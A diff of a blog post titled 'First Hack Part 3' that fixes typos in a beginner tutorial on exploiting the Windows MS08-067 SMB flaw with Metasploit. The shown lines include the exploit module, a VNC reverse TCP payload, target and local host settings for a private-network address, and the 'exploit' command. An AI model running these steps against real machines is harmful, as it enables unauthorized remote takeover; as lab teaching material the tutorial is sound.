@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "First Hack Part 2 (Searching for Targets and their Weaknesses)"
+title:  "First Hack Part 3 (Searching for Targets and their Weaknesses)"
 date:   2018-04-16 14:56:03 -0400
 categories: jekyll update
 ---
@@ -18,7 +18,7 @@ Searching for the exploit command
 
 Loading the exploit (Code to exploit the weakness)
 
-Loading the payload (Software used to give you controll)
+Loading the payload (Software used to give you control)
 
 Set the Settings and "pwn the box"
 
@@ -28,9 +28,9 @@ The first thing we need to do is use the code identified in part 2. MS08_067 is 
 
 [https://www.rapid7.com/db][rapid7]
 
-Type "MS08_067" in the search field and make sure "Metasploit Moduel" is selected in the dropdown box.
+Type "MS08_067" in the search field and make sure "Metasploit Module" is selected in the dropdown box.
 
-Look at the code under "Moduel Name." We will use that once we load metasploit
+Look at the code under "Module Name." We will use that once we load Metasploit
 
 <b>Loading the Exploit and Payload</b>
 
@@ -52,7 +52,7 @@ Use the exploit we found in Rapid7 with the "use" command.
 use exploit/windows/smb/ms08_067_netapi
 {% endhighlight %}
 
-There are many useful payloads. I will recomend we use a reverce TCP payload in order to gain a VNC session. Load the payload with the "set" command.
+There are many useful payloads. I will recommend we use a reverse TCP payload in order to gain a VNC session. Load the payload with the "set" command.
 
 {% highlight ruby %}
 set PAYLOAD windows/vncinject/reverse_tcp
@@ -70,9 +70,9 @@ You should get something that looks like this
 
 ![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)
 
-You may have noticed a few lines are missing. Specificly LHOST and RHOST. LHOST is the local host (your PC) and RHOST is the remote host (target PC)
+You may have noticed a few lines are missing. Specifically LHOST and RHOST. LHOST is the local host (your PC) and RHOST is the remote host (target PC)
 
-Lets fill those in with the set command
+Let's fill those in with the set command
 
 {% highlight ruby %}
 set RHOST 192.168.1.244
@@ -87,7 +87,7 @@ Press Ctrl+Shift+T in order to bring up a new terminal tab
 sifconfig
 {% endhighlight %}
 
-You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likley different.
+You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likely different.
 
 ![image tooltip](/blog/images/ms08_067/ifconfig.JPG)
 
@@ -114,7 +114,7 @@ Finally, run the command
 exploit
 {% endhighlight %}
 
-Congradulations, you did it!!
+Congratulations, you did it!!
 
 ![image tooltip](/blog/images/ms08_067/owned.JPG)
 
